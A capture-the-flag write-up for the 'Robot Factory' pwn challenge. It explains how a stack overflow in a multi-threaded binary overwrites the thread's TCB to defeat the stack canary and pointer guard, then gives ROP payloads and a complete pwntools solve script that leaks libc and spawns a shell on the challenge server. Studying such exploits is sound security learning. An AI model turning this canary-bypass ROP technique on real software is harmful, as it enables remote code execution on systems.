# (pwn) Robot Factory

We are provided with the `robot_factory` binary and a `libc.so.6`, but no source, so the first thing we did from here was investigate how the binary worked and what it did.

The program prompts you for a type of "robot" (either number of string), and lets you have the robot do some kind of operation. It then spits out the result and "shuts down" (frees) the robot.

All of the above is done in a multi-threaded fashion, as such:

1. User creates a robot (number/string)
2. User selects operation (addition/subtraction/multiplication)
3. After a slight delay (from a sleep(1)), the program spits out the result of the robot and deletes it

Right away upon reversing the program we noticed that it is multi-threaded - each robot gets its own thread to process things, and there is a dedicated thread for killing the robots once they are done (running the `self_destruct_protocol` function).

Through some "fuzzing" (really just manually screwing around with the binary), we discovered that there were several issues with basically every single operation in the program. Here's a few:

1. The number operations printed out a stack address instead of an actual result.
2. The string addition/multiplication operations often resulted in a stack overflow
3. We could somehow trigger a tcache double free with string operations
    * We couldn't replicate this in practice, but later found it was due to the unimplemented subtraction being incorrectly handled

The second problem in that list made this seem like an open and shut problem, other than the *small* issue of there being a stack canary in the `do_string` function. Nonetheless, it seemed extremely promising.

Eventually, through sheer blind luck, we discovered something extremely bizarre. Let's see what happens when we try a stack overflow with 300 characters using the multiply function:
![](https://i.imgur.com/dZpHeo6.png)

We tripped the canary check. That seems about right. Now let's try the same thing with 3000 characters:
![](https://i.imgur.com/DwWPNN0.png)


Okay, so what? We just segfaulted. Obviously that's because the `memcpy` ran off the stack, nothing inter-
![](https://i.imgur.com/TxwVXP2.png)

*What?*

How did we just bypass the canary check??? Didn't we just overwrite it???

After some research, we discovered what was happening when we stumbled upon this blogpost: https://vishnudevtj.github.io/notes/star-ctf-2018-babystack

In summary, every thread has its own "Thread Control Block" (TCB) that stores thread-specific info. This struct is stored at the top of every thread's stack.

It turns out that the canary is unique per-thread, so it ends up stored in the TCB. When we trigger an overflow with a huge amount of characters (but not enough to go off the stack), it overwrites the canary in our current stack frame, as well as the saved canary. If we overwrite these with the same thing, we can pass the canary check even though we wrote past it.

From here, this becomes a relatively normal ROP challenge, albeit with a few restrictions; since the string multiply operation is the only one that can get us an overflow large enough to overwrite the TCB, we need to have a payload that has both of the overwritten canaries match each other after cycling over and over.

Other than that caveat, our ROP chain is pretty standard. There's no PIE or seccomp, and we're basically unrestricted in terms of length (264 bytes of space is anything but restrictive), so we went the typical route of GOT libc leak -> `system` call. Here is our first payload:

```python=
payload = b''
payload += p64(pop_rdi) # start of rop chain - will also overwrite og canary
payload += p64(e.got['puts'])
payload += p64(e.plt['puts']) 
payload += p64(e.plt['sleep']) # sleep 4ever woohoo
payload += p64(1000000)
payload += p64(pop_rdi) # this will overwrite canary copy
payload += p64(0x4141414141414141) # saved rbp
```

The multi-threaded nature of the program lets us be a little more liberal with our ROP chain. Why should we have to read in the second stage (`system` call to get shell) when we could just have this thread go to sleep for the forseeable future?

However, we see something strange when we try to call system in our ROP chain:
![](https://i.imgur.com/MAWzsvb.png)

In the call to `system`, we end up calling what looks like a random address. This is a separate issue from the stack being misaligned, since we already addressed that, so there must be another problem.

It turns out that the TCB also contains the pointer guard secret for the thread - a mechanism through which libc encrypts (function) pointers. This is a problem, since we have completely clobbered it already. One of these pointers is used in `system`, so we're going to have to work around that somehow.

We ended up using a libc onegadget, since that was a bit simpler than setting up a full execve syscall ROP chain:
```python=
payload = b''
payload += p64(onegadget)
payload += p64(pop_rdx_r12) # overwrites frame canary
payload += p64(0x4141414141414141)
payload += p64(pop_rsi) # start of rop chain
payload += p64(0)
payload += p64(pop_rdx_r12) # overwrites TCB canary
payload += p64(0)
payload += p64(0)
```

Once we combine both of these, we can obtain a shell and the flag: ![](https://i.imgur.com/gATy5wQ.png)


### Full Solve Script

```python=
import sys
from pwn import *

path = './robot_factory'
host = '167.172.49.117'
port = 30293

e = ELF(path)
libc = ELF('./libc.so.6')

if len(sys.argv) > 1:
    DEBUG = True
    p = gdb.debug(path, '''
        c
    ''', api=True)
else:
    DEBUG = False
    p = remote(host, port)

p.sendline(b's')
p.sendline(b'm')

pop_rdi = 0x401ad3
ret = pop_rdi + 1

payload = b''
payload += p64(pop_rdi) # start of rop chain - will also overwrite og canary
payload += p64(e.got['puts'])
payload += p64(e.plt['puts']) 
payload += p64(e.plt['sleep']) # sleep 4ever woohoo
payload += p64(1000000)
payload += p64(pop_rdi) # this will overwrite canary copy
payload += p64(0x4141414141414141) # saved rbp

assert(b'\n' not in payload)

p.sendline(payload)
p.sendline(b'80')

leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')
libc.address = u64(leak) - libc.symbols['puts']
log.info(f"libc base: 0x{libc.address:x}")

binsh = next(libc.search(b'/bin/sh\x00'))
pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
onegadget = libc.address + 0xe6c84

payload = b''
payload += p64(onegadget)
payload += p64(pop_rdx_r12)
payload += p64(0x4141414141414141)
payload += p64(pop_rsi) # start of rop chain
payload += p64(0)
payload += p64(pop_rdx_r12)
payload += p64(0)
payload += p64(0)

assert(b'\n' not in payload)

p.sendline(b's')
p.sendline(b'm')
p.sendline(payload)
p.sendline(b'70')

p.interactive()

```
